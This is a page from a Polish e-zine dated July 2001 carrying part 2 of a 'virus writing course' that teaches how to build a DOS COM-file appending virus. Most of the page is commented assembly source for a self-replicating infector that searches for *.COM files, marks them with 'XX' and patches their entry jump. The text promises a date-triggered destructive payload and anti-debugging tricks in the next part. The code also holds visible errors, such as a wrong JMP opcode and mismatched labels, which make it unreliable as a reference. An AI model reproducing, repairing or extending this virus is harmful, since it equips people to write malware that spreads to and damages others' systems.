<html><head><meta http-equiv=Content-Type content="text/html; charset=iso-8859-2"><meta http-equiv=Content-Language content=pl><style>A:link {text-decoration: none} A:visited {text-decoration: none} A:active {text-decoration: none} A:hover {text-decoration: underline;color="#478DE7"} </style><title>MagaZin :: numer 2 - lipiec 2001</title></head><body link=0080C0 vlink=0080C0 alink=0080C0 topmargin=0 bottommargin=0 bgcolor="#000000"><div align=center><center><table border=0 width=700 cellspacing=0 cellpadding=0 height=250 bgcolor="#FFFFFF"><tr><td width=697 height=30 valign=top><img border=0 src="../img/2.gif" width=700 height=150></td></tr><tr><td width=697 height=1 valign=top><div align=center><center><table border=0 width="92%" cellspacing=0 cellpadding=4><tr><td width="10%"><a href="19.htm"><img border=0 src="../img/4.gif" width=50 height=25 align=right></a></td><td width="23%"><font face=Arial size=1>poprzednia</font></td><td width="33%"><p align=center><a href="spis.htm"><img border=0 src="../img/6.gif" width=200 height=20></a></td></center></center><td width="23%"><p align=right><font size=1 face=Arial>nastêpna</font></td><td width="10%"><a href="21.htm"><img border=0 src="../img/3.gif" width=50 height=25></a></td></tr></table></div></td></tr><center><tr><td width=697 height=83 valign=top><div align=center><center><table border=0 width="92%" height=400 cellspacing=10 cellpadding=2><tr><td width="100%" height=5 valign=top colspan=2></td></tr><tr><td width="100%" height=16 valign=top bgcolor="#000000" colspan=2><img border=0 src="../img/10.gif" width=225 height=14></td></tr><tr><td width="100%" height=1 valign=top colspan=2><font face=Arial size=2><br><b>Kurs pisania wirusów, cz. 2</b><br><br></font></td></tr><tr><td width="50%" height=370 valign=top></center></center><p align=justify><font face=Arial><b><font size=2><span style="mso-bidi-font-size: 12.0pt">1. ZACZYNAMY</span></font></b><span style="mso-bidi-font-size: 12.0pt"><font size=2><br><br>W tym FAQ zajmiemy siê jeszcze wirusami plików COM. Znamy ju¿ budowê takiego pliku. Wiemy jak one dzia³aj±. Potrafimy równie¿ wykonaæ podstawowe operacje w Assemblerze, tzn. dopisywaæ siê do pliku, odczytywaæ plik, szukaæ pliku, zmieniaæ jego datê i czas ostatniej modyfikacji i wiele innych. Jednak nasze dotychczas napisane wirusy by³y ma³o efektowne. Uszkadza³y trwale mo¿e bardzo wa¿ne dane. Chyba nie oto nam chodzi³o, nie :-), ale uwa¿am, ze taki wstêp do pisania wirusów jest bardzo dobry. Teraz nauczymy siê dopisywania do innych programów bez ich nie uszkadzania. Do tego celu pos³u¿ê siê wirusami wygenerowanymi przez program IVP. S± one bardzo przejrzyste i proste. Nie doradzam nikomu tworzenia wirusów tym programem, gdy¿ s± one niesamodzielne, ale zachêcam do przestudiowania algorytmu programu IVP.<br><br><b>2. KILKA KOMEND</b><br><br>Zanim zaczniemy pisaæ wirusa przypomnê kilka komend, które bêd± potrzebne do jego stworzenia:<br><br><font color="#478de7">MOVSB,MOVSW</font> - instrukcja kopiuje do komórki ES:DI warto¶æ komórki DS:SI oraz zmniejsza DI&nbsp;<br> i SI o rozmiar komórki, je¶li znacznik D jest ustawiony lub zwiêksza gdy D jest wyzerowany.<br><br><font color="#478de7">LEA rej,adr</font> - instrukcja oblicza offset adresu drugiego argumentu i zapamiêtuje go w pierwszym operandzie.<br><br><font color="#478de7">SUB X,Y</font> - instrukcja powoduje odjecie warto¶ci rejestru lub sta³ej Y od X i zapamiêtanie wyniku w rejestrze X<br><br><b>3. DO ROBOTY</b><br><br>Zastanówmy siê, jak ma dzia³aæ nasz wirus. Powinien wykonywaæ on kilka kroków:<br><br>a) Odnale¼æ plik do infekcji<br> b) Sprawdziæ, czy czasem nie jest ju¿ on zainfekowany<br> c) Dokleiæ siê na jego koñcu<br> d) Zapamiêtaæ jego trzy pierwsze bajty<br> e) Zmodyfikowaæ te pierwsze bajty tak, by wskazywa³y na kod wirusa<br><br>Dopisywanie wirusa jest bardzo proste, jest jednak pewna pu³apka, na któr± wszyscy pocz±tkuj±cy siê ³api±. Nie wolno podawaæ adresów sta³ych, np. nie mo¿na przy funkcji wyszukuj±cej plik podaæ nazwê tego pliku jako np.&nbsp;<br><br><font color="#478de7">MOV DX,OFFSET Maska</font><br><br>Kompilator asemblerowy kompiluj±c ta instrukcje &quot;OFFSET Maska&quot; zamieni na sta³± wskazuj±c± na zmienna Maska, np. 10H. Teraz je¶li wirus dopisze siê do pliku o wielko¶ci np. 100H, to pod adresem 10H bêdzie znajdowa³ siê kod programu, a nie nazwa. Nazwa szukanego pliku bêdzie znajdowa³a siê pod adresem 110H. Nasuwa siê teraz pytanie. Sk±d mo¿emy wiedzieæ ile trzeba dodaæ? Odpowiedz jest prostsza pewnie ni¿ my¶lisz. Do tego celu trzeba pos³u¿yæ siê instrukcja CALL. Po wykonaniu instrukcji CALL na stos zostaje po³o¿ony adres aktualnie wykonywanej komendy (IP), a dok³adniej komendy, od której ma byæ dalej wykonywany program, po to by po instrukcji RET procesor wiedzia³ dok±d ma skoczyæ (wróciæ). Je¶li wiec napiszemy:<br><br><font color="#478de7">CALL Etyk1<br> Etyk1: POP AX</font><br><br>To w rejestrze AX znajdzie siê adres (IP) aktualnie wykonywanego rozkazu (czyli OFFSET Etyk1). Je¶li ju¿ wiemy ile mamy dodawaæ do ka¿dego adresu napisanie wirusa jest bardzo proste. Po zdjêciu ze stosu IP musimy go jednak gdzie¶ zapisaæ. Mo¿na to zrobiæ w jakiej¶ zmiennej, ale to bardzo skomplikuje kod wirusa, a mo¿na tez zapamiêtaæ go w rejestrze BP. Rejestr ten nie jest zmieniany przez ¿adn± funkcje i dopóki sami nie zmienimy jego warto¶ci bêdzie zawiera³ adres punktu startu.<br><br><b>4. WIRUSSS</b><br><br>Przejd¼my do rzeczy. Poni¿ej znajduje siê kod wirusa wygenerowanego przez program IVP i zmodyfikowanego przeze mnie tak by by³ prostszy. Przejrzyj go dok³adnie. Zosta³ on wzbogacony komentarzami by u³atwiæ jego zrozumienie.POCZ¡TEK:<br><br><font color="#478de7">CODE SEGMENT PUBLIC 'CODE'<br> ASSUME CS:CODE<br> ORG 100H<br><br>Start:<br> DB 0E9H,2,0 ; skok do nastêpnej komendy<br> DW 'XX' ; identyfikator pliku<br><br>Virus:&nbsp;<br> CALL RealCode ; skok do RealCode<br><br>RealCode:&nbsp;<br> POP BP ; zdjêcie IP ze stosu<br> SUB BP,3 ; 3 to d³ugo¶æ instrukcji CALL RealCode<br> ; teraz mamy w rejestrze BP warto¶æ,<br> ; któr± musimy dodawaæ do ka¿dego z<br> ; adresów<br> LEA SI,OFFSET [BP+OldJump] ; do SI adres OldJUMP<br> MOV DI,100H ; do DI adres 100H<br> PUSH DI ; na stos warto¶æ 100H<br> ; by zadzia³a³a instrukcja RET<br> MOVSB ; przekopiowanie bajtu<br> MOVSW ; i jeszcze dwóch bajtów<br> MOVSW ; i kolejne dwa bajty<br> ; z SI do DI. Teraz na pocz±tku<br> ; programu znajduje siê jego<br> ; oryginalny KOD<br> MOV [BP+Counter],BYTE PTR 0 ; wyzerowanie licznika zara¿eñ<br> LEA DX,[BP+OFFSET ComFileSpec] ; do DX nazwa szukanego pliku<br></font></font><font color="#478de7" size=2>CALL FindFirst ; szukanie i zara¿enie pliku<br> RET ; powrót pod 100H i wykonanie<br> ; oryginalnego programu</font></span></font></td><td width="50%" height=370 valign=top><table border=0 cellPadding=0 cellSpacing=0 height=80 width="100%"><center><tbody><tr><td height=64 width="100%"><p align=justify style="MARGIN-BOTTOM: 0px"><font face=Arial><span style="mso-bidi-font-size: 12.0pt"><font color="#478de7" size=2>FindFirst: ; szukanie pliku<br> CMP [BP+Counter],5 ; je¶li zainfekowane&nbsp;<br> JA Quit ; wiêcej ni¿ 5 plików to QUIT<br> MOV AH,4EH ; szukanie pliku<br> MOV CX,7 ; z dowolnymi atrybutami</font><font size=2><font color="#478de7"><br><br>FindNext:&nbsp;<br> INT 21H<br> JC Quit ; je¶li nie znaleziono, to QUIT<br> CALL Infection ; je¶li znaleziono, to infekcja<br><br>FindNext2:<br> MOV AH,4FH ; szukanie kolejnej ofiary :-)<br> JMP FindNext<br><br>Quit:&nbsp;<br> RET&nbsp;<br><br>Infection: ; infekcja zbioru<br> MOV AL,0H ; do AL 0, czyli<br> CALL Open ; otwarcie zbioru tylko do&nbsp;<br> ; odczytu<br> MOV AH,3FH ; przeczytanie<br> MOV CX,1AH ; 1A bajtów<br> LEA DX,[BP+OFFSET Buffer] ; i zapamiêtanie ich w buforze<br> INT 21H<br> MOV AH,3EH ; zamkniecie pliku<br> INT 21H<br><br>CheckCOM:<br> MOV BX,WORD PTR [BP+80H+1AH] ; do BX wielko¶æ zbioru z&nbsp;<br> ; bloku DTA<br> CMP WORD PTR CS:[BP+Buffer+3],'XX' ; je¶li 4 i 5 bajt zbioru&nbsp;<br> ; to XX<br> JE QuitInfect ; tzn. ze jest on ju¿ zara¿ony<br> ; wiec koniec infekcji<br> JMP InfectCOM ; skok do INFECTCOM<br><br>QuitInfect:<br> RET<br><br>InfectCOM:<br> SUB BX,3 ; zmniejszenie wielko¶ci&nbsp;<br> ; zbioru o 3, bo tyle zajmuje<br> ; polecenie JMP<br> LEA SI,[BP+Buffer] ; do SI adres bufora<br> LEA DI,[BP+OldJump] ; do DI adres OLDJUMP<br> MOVSB ;\ / przekopiowanie trzech&nbsp;<br> MOVSW ;- pierwszych bajtów pliku<br> MOVSW ;/\ do zmiennej OLDJUMP<br> MOV [BP+Buffer],BYTE PTR 09EH ; zamiana pierwszego bajtu w&nbsp;<br> ; buforze na 9E, czyli JMP<br> MOV WORD PTR [BP+Buffer+1],BX ; dalej zapisanie wielko¶ci<br> ; zbioru.<br> MOV WORD PTR [BP+Buffer+3],'XX' ; za tym wszystkim w 4 i 5<br> ; bajcie zapisanie XX, czyli<br> ; identyfikator zara¿enia<br><br>FinishInfection:<br><br>MOV AL,2 ; AL=2 czyli<br> CALL Open ; otwarcie zbioru do odczytu i zapisu<br> MOV AH,40H ; zapisanie w pliku<br> LEA DX,[BP+Buffer] ; z bufora<br> MOV CX,5 ; 5 bajtów<br> INT 21H<br> JC CloseFile ; je¶li b³±d, to zamknij plik<br> MOV AL,2 ; AL=2, czyli<br> CALL Move_fp ; ustawienie wska¼nika na&nbsp;<br> ; koniec pliku<br> MOV AH,40H ; zapisanie<br> MOV CX,EOF-Virus ; (koniec - pocz±tek) bajtów<br> LEA DX,[BP+OFFSET Virus] ; pocz±wszy od pocz±tku wirusa<br> INT 21H<br> INC [BP+Counter] ; zwiêkszenie licznika&nbsp;<br> ; zara¿onych zbiorów<br> CloseFile:&nbsp;<br> MOV AH,3EH ; zamkniêcie doj¶cia do pliku<br> INT 21H<br> RET<br><br>Move_fp: ; zmiana po³o¿enia wska¼nika<br> MOV AH,42H ; w pliku<br> XOR CX,CX<br> XOR DX,DX<br> INT 21H<br> RET<br><br>Open:&nbsp;<br> MOV AH,3DH ; otwarcie pliku<br> MOV DX,9EH<br> INT 21H<br> XCHG AX,BX<br> RET<br> ComFileSpec DB &quot;*.COM&quot;,0 ; szukany plik<br> OldJump DB 0CDH,020H,0,0,0 ; zapamiêtane 3-pierwsze bajty<br><br>EFO EQU $<br><br>; zapisywana jest czê¶æ wirusa a¿ do EOF. Zmienne poni¿ej nie s±<br> ; zapisywane w pliku, gdy¿ tylko zwiêkszy³yby jego objêto¶æ, a<br> ; ich warto¶ci nie s± wa¿ne<br><br>Counter DB 0 ; licznik zara¿eñ<br> Buffer DB 01AH DUB (?) ; bufor<br><br>EOV EQU $<br> END START</font><br><br>KONIEC<br><br>Wirus ten jest bardzo prosty i ma pewne b³êdy. Jego ofiary zmieniaj± swoja datê i czas ostatniej modyfikacji. Mo¿na go o to w³a¶nie udoskonaliæ.&nbsp;<br><br>Na razie to wszystko. W kolejnej czê¶ci tego FAQ zajmê siê jeszcze plikami COM. Udoskonalimy kod naszego wirusa. Dodamy procedurê destrukcyjna, która uruchomi siê konkretnego dnia. Zabezpieczymy równie¿ naszego wirusa przed ogl±daniem go disassemblerami i próbami jego debuggowania.</font></span></font></p><p align=justify style="MARGIN-BOTTOM: 0px"><font size=2 face=Arial><span style="mso-bidi-font-size: 12.0pt"><b>Do tego numeru zosta³ do³±czony darmowy kompilator assemblera <a href="../A86/A86.COM">A86</a>, dziêki któremu mo¿na wykonaæ opisany program</b></span><b><span style="mso-bidi-font-size: 12.0pt">.</span></b></font></p></td></tr></tbody></center></table></td></tr><tr><td width="100%" height=34 valign=top colspan=2><p align=right><font size=2 face=Arial><b>Binboy<br></b>binboy@free.com.pl</font></td></tr><center><center><tr><td width="100%" height=15 valign=top colspan=2 bgcolor="#000000"><b><font face=Verdana color="#FFFFFF" size=1>&nbsp;Copyright &copy; MagaZin 2001</font></b></td></tr></table></center></div></td></tr></table></div></body></html>